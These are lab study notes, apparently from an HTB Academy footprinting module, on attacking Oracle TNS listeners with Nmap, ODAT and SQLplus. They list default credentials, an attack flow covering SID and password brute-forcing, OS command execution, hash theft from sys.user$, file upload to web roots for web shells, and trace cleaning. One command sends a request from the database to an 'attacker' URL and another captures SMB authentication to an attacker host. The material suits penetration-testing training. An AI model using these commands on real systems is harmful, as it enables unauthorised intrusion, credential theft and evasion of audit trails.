# Oracle TNS (Transparent Network Substrate)

> Communication protocol facilitating communication between Oracle databases and applications over networks.

---

## Overview

**Oracle Transparent Network Substrate (TNS)** is a communication protocol introduced as part of Oracle Net Services software suite.

| Characteristic | Details |
|----------------|---------|
| **Purpose** | Facilitates communication between Oracle databases and client applications |
| **Protocols Supported** | TCP/IP, UDP, IPX/SPX, AppleTalk |
| **Security** | Built-in encryption mechanism for data transmission |
| **Industries** | Healthcare, Finance, Retail (large, complex databases) |

### TNS Capabilities

| Feature | Description |
|---------|-------------|
| **Name Resolution** | Resolves service names to network addresses |
| **Connection Management** | Manages database connections |
| **Load Balancing** | Distributes connections across instances |
| **Security** | SSL/TLS encryption, IPv6 support |

---

## Default Port

| Port | Protocol | Description |
|------|----------|-------------|
| **TCP 1521** | Oracle TNS | Default TNS listener port |

---

## Configuration Files

Configuration files are typically located in `$ORACLE_HOME/network/admin` directory.

### tnsnames.ora (Client-Side)

Used by client-side Oracle Net Services to resolve service names to network addresses.

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

### listener.ora (Server-Side)

Defines the listener process properties and parameters for receiving incoming client requests.

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

---

## Default Configuration

| Setting | Details |
|---------|---------|
| **Default Port** | TCP 1521 (can be changed) |
| **Protocols** | TCP/IP, UDP, IPX/SPX, AppleTalk |
| **Remote Management** | Enabled in Oracle 8i/9i, disabled in 10g/11g |
| **Authentication** | Hostnames, IP addresses, usernames/passwords |
| **Encryption** | Oracle Net Services encrypts client-server communication |

### Default Passwords to Remember

| Service/Version | Default Password |
|-----------------|------------------|
| **Oracle 9** | `CHANGE_ON_INSTALL` |
| **Oracle 10** | No default password |
| **Oracle DBSNMP** | `dbsnmp` |

---

## TNS Configuration Settings Reference

| Setting | Description |
|---------|-------------|
| `DESCRIPTION` | Descriptor providing database name and connection type |
| `ADDRESS` | Network address (hostname and port) |
| `PROTOCOL` | Network protocol (TCP, UDP, etc.) |
| `PORT` | Port number for communication |
| `CONNECT_DATA` | Connection attributes (service name, SID, protocol) |
| `INSTANCE_NAME` | Database instance name to connect to |
| `SERVICE_NAME` | Service name client wants to connect to |
| `SERVER` | Server type (dedicated or shared) |
| `USER` | Authentication username |
| `PASSWORD` | Authentication password |
| `SECURITY` | Connection security type |
| `VALIDATE_CERT` | Whether to validate SSL/TLS certificate |
| `SSL_VERSION` | SSL/TLS version to use |
| `CONNECT_TIMEOUT` | Time limit for establishing connection (seconds) |
| `RECEIVE_TIMEOUT` | Time limit for receiving response (seconds) |
| `SEND_TIMEOUT` | Time limit for sending request (seconds) |
| `SQLNET.EXPIRE_TIME` | Time limit to detect failed connection (seconds) |
| `TRACE_LEVEL` | Tracing level for connection |
| `TRACE_DIRECTORY` | Directory for trace files |
| `TRACE_FILE_NAME` | Name of trace file |
| `LOG_FILE` | File for log information |

---

## PL/SQL Exclusion List

Oracle databases can be protected using **PL/SQL Exclusion List (PlsqlExclusionList)**:

- User-created text file placed in `$ORACLE_HOME/sqldeveloper` directory
- Contains names of PL/SQL packages or types to exclude from execution
- Serves as a blacklist for Oracle Application Server access

---

## System Identifier (SID)

| Aspect | Details |
|--------|---------|
| **Purpose** | Unique name identifying a particular database instance |
| **Usage** | Client specifies SID in connection string |
| **Default** | If not specified, uses value from tnsnames.ora |
| **Importance** | Incorrect SID = connection failure |

---

## Setting Up ODAT (Kali Linux)

**Oracle Database Attacking Tool (ODAT)** - Open-source penetration testing tool for enumerating and exploiting Oracle database vulnerabilities.

### ODAT Capabilities

| Category | Features |
|----------|----------|
| **Enumeration** | TNS listener interaction, SID/Service Name guessing |
| **Authentication** | Password guessing/brute forcing, hashed password stealing |
| **File Operations** | Upload, download, delete files on DB server |
| **Command Execution** | Via Java, DBMS_SCHEDULER, external tables |
| **Network** | Port scanning via UTL_HTTP, UTL_TCP, HTTPURITYPE |
| **Data Access** | Read files via CTXSYS, search databases/tables/columns |
| **Post-Exploitation** | Privilege escalation, SMB auth capture, CVE exploitation |
| **Cleanup** | Cleaning traces and logs, unwrapping PL/SQL source code |

### Installation on Kali (2025.2 ARM64/aarch64 - Parallels VM)

```bash
# Step 1: Install system dependencies
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1t64 libgmp-dev python3-scapy

# Step 2: Download cx_Oracle source
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz

# Step 3: Clone ODAT and initialize submodules
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat
git submodule init
git submodule update

# Step 4: Create Python venv and install all dependencies
cd ~/odat
python3 -m venv venv
source venv/bin/activate

# IMPORTANT: Pin setuptools below 81 (v82+ removed pkg_resources which cx_Oracle needs)
pip install "setuptools<81" wheel

# Install cx_Oracle from source
sudo chown -R $USER:$USER ~/cx_Oracle-8.3.0
cd ~/cx_Oracle-8.3.0
rm -rf build
pip install --no-build-isolation .

# Install remaining Python dependencies
cd ~/odat
pip install python-libnmap colorlog termcolor passlib pycryptodome pyasyncore

# Create Crypto symlink (ODAT uses old pycrypto import paths)
cd venv/lib/python3.13/site-packages
ln -s Cryptodome Crypto
cd ~/odat

# Step 5: Fix the shebang for venv compatibility
sed -i '1s|#!/usr/bin/python|#!/usr/bin/env python3|' odat.py
```

### Running ODAT

```bash
cd ~/odat
source venv/bin/activate
python3 odat.py -h
```

> **Note:** Always use `python3 odat.py` (not `./odat.py`) because the default shebang points to `#!/usr/bin/python` which bypasses the venv. Fix the shebang with the sed command above to use `./odat.py` directly.

```
            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------
```

### ODAT Troubleshooting

| Error | Fix |
|-------|-----|
| `No module named 'pkg_resources'` | `pip install "setuptools<81"` |
| `No module named 'Crypto'` | `ln -s Cryptodome Crypto` in site-packages |
| `No module named 'asyncore'` | `pip install pyasyncore` (removed in Python 3.12+) |
| `No module named 'cx_Oracle'` | Install cx_Oracle inside the venv, not system-wide |
| Permission denied on build | `chown` the source dir + `rm -rf build/` |
| `No module named 'libnmap'` | `pip install python-libnmap` |
| scapy warning | `sudo apt install python3-scapy` system-wide |

### ODAT Usage Examples

```bash
# Scan all modules against a target
python3 odat.py all -s <target_ip> -p 1521

# Guess SIDs on a target
python3 odat.py sidguesser -s <target_ip> -p 1521

# Guess passwords with known SID
python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID>

# Execute system commands via Java
python3 odat.py java -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --exec <command>

# Upload a file
python3 odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --putFile <remote_dir> <remote_file> <local_file>

# Download a file
python3 odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --getFile <remote_dir> <remote_file> <local_file>

# Steal password hashes
python3 odat.py passwordstealer -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass>

# Search for keywords in DB
python3 odat.py search -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --keywords "password,credit_card,ssn"
```

### ODAT Quick Navigation Guide

#### Step 0: Launch ODAT

Always run ODAT from its install directory. The `sidguesser` and `passwordguesser` modules load wordlists relative to the script location, so running from `~/odat` avoids file-not-found issues.

```bash
cd ~/odat && source venv/bin/activate
python3 odat.py -h
```

#### Step-by-Step Attack Flow

The typical workflow when using ODAT follows this order:

```
0. cd ~/odat && activate venv  -->  1. Discover TNS Listener  -->  2. Find SIDs  -->  3. Get Credentials  -->  4. Exploit
```

#### Phase 1: Discovery - Is Oracle Running?

```bash
# Use Nmap first to confirm port 1521 is open
sudo nmap -p1521 -sV <target_ip> --open

# Or use ODAT tnscmd to interact with the listener directly
python3 odat.py tnscmd -s <target_ip> -p 1521 --ping
python3 odat.py tnscmd -s <target_ip> -p 1521 --version
python3 odat.py tnscmd -s <target_ip> -p 1521 --status
```

#### Phase 2: Enumerate SIDs

You need a valid SID before you can authenticate. Guess or brute-force it:

```bash
# ODAT SID guesser (uses built-in wordlist)
python3 odat.py sidguesser -s <target_ip> -p 1521

# Nmap SID brute
sudo nmap -p1521 --script oracle-sid-brute <target_ip>
```

Common SIDs to try manually: `XE`, `ORCL`, `ORCLCDB`, `ORCLPDB1`, `PLSExtProc`

#### Phase 3: Get Credentials

Once you have a SID, try to find valid credentials:

```bash
# ODAT password guesser (tries common Oracle default accounts)
python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID>

# Use a custom username/password list
python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID> --accounts-file accounts.txt
```

Default accounts to remember: `scott/tiger`, `system/manager`, `sys/change_on_install`, `dbsnmp/dbsnmp`

#### Phase 4: Exploit (With Valid Credentials)

Once you have creds + SID, the real fun begins. Choose your module:

```bash
# Run ALL exploit modules at once (noisy but thorough)
python3 odat.py all -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass>
```

Or pick specific modules:

| Goal | Module | Command |
|------|--------|---------|
| **Read a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --getFile /etc passwd /tmp/passwd` |
| **Upload a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --putFile /tmp shell.txt ./shell.txt` |
| **Delete a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --removeFile /tmp shell.txt` |
| **Execute OS command** | `java` | `python3 odat.py java -s <ip> -d <SID> -U <user> -P <pass> --exec whoami` |
| **Steal password hashes** | `passwordstealer` | `python3 odat.py passwordstealer -s <ip> -d <SID> -U <user> -P <pass>` |
| **Search DB for keywords** | `search` | `python3 odat.py search -s <ip> -d <SID> -U <user> -P <pass> --keywords "password,ssn"` |
| **Privilege escalation** | `privesc` | `python3 odat.py privesc -s <ip> -d <SID> -U <user> -P <pass>` |
| **HTTP requests from DB** | `utlhttp` | `python3 odat.py utlhttp -s <ip> -d <SID> -U <user> -P <pass> --url http://attacker/test` |
| **SMB capture** | `smb` | `python3 odat.py smb -s <ip> -d <SID> -U <user> -P <pass> --capture <attacker_ip>` |
| **Clean traces** | `clean` | `python3 odat.py clean -s <ip> -d <SID> -U <user> -P <pass>` |

#### Common Flags Reference

| Flag | Description |
|------|-------------|
| `-s` | Target IP address |
| `-p` | Target port (default 1521) |
| `-d` | SID (database name) |
| `-U` | Username |
| `-P` | Password |
| `--sysdba` | Connect with SYSDBA privileges |
| `--no-color` | Disable colored output |
| `-v` | Verbose output |

---

## Footprinting the Service

### Nmap - Basic TNS Scan

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

### Nmap - SID Bruteforcing

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```

### ODAT - Full Enumeration

```bash
./odat.py all -s 10.129.204.235
```

```
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
[!] Notice: 'outln' account is locked, so skipping this username for password
[+] Valid credentials found: scott/tiger. Continue...
```

---

## Quick Reference

| Task | Command |
|------|---------|
| **Nmap TNS scan** | `sudo nmap -p1521 -sV <target> --open` |
| **Nmap SID brute** | `sudo nmap -p1521 --script oracle-sid-brute <target>` |
| **ODAT full scan** | `./odat.py all -s <target>` |
| **Test ODAT** | `./odat.py -h` |
| **SQLplus login** | `sqlplus user/pass@<target>/SID` |
| **SQLplus as sysdba** | `sqlplus user/pass@<target>/SID as sysdba` |
| **ODAT file upload** | `./odat.py utlfile -s <target> -d SID -U user -P pass --sysdba --putFile <path> <file> <local>` |

---

## Connecting with SQLplus

Once valid credentials are found (e.g., `scott/tiger`), connect using SQLplus:

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

```
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

### Fix: libsqlplus.so Error

If you encounter: `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file`

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

---

## Database Enumeration

### List All Tables

```sql
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP
...SNIP...
```

### Check User Privileges

```sql
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

---

## Privilege Escalation - Login as SYSDBA

Try connecting as System Database Admin (sysdba) for higher privileges:

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

```
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

---

## Extract Password Hashes

With sysdba access, extract password hashes for offline cracking:

```sql
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

---

## File Upload via ODAT

Upload files to the target system (requires knowing web root path).

### Default Web Root Paths

| OS | Path |
|----|------|
| **Linux** | `/var/www/html` |
| **Windows** | `C:\inetpub\wwwroot` |

### Test File Upload

```bash
# Create test file
echo "Oracle File Upload Test" > testing.txt

# Upload via ODAT
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

```
[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

### Verify Upload

```bash
curl -X GET http://10.129.204.235/testing.txt
```

```
Oracle File Upload Test
```

---

## Key Takeaways

1. **Default port is TCP 1521** - Always scan this port for Oracle services
2. **SID is critical** - Must know the SID to connect; can be bruteforced
3. **Default passwords exist** - Oracle 9 uses `CHANGE_ON_INSTALL`, DBSNMP uses `dbsnmp`
4. **Two config files** - `tnsnames.ora` (client) and `listener.ora` (server)
5. **ODAT is essential** - Comprehensive tool for Oracle enumeration and exploitation
6. **Common credentials** - `scott/tiger` is a classic default Oracle account
7. **Try sysdba** - Even low-priv users may connect as sysdba for full access
8. **Extract hashes** - `select name, password from sys.user$` for offline cracking
9. **File upload** - Use ODAT utlfile module to upload web shells if web server exists

---

*HTB Academy - Footprinting Module*
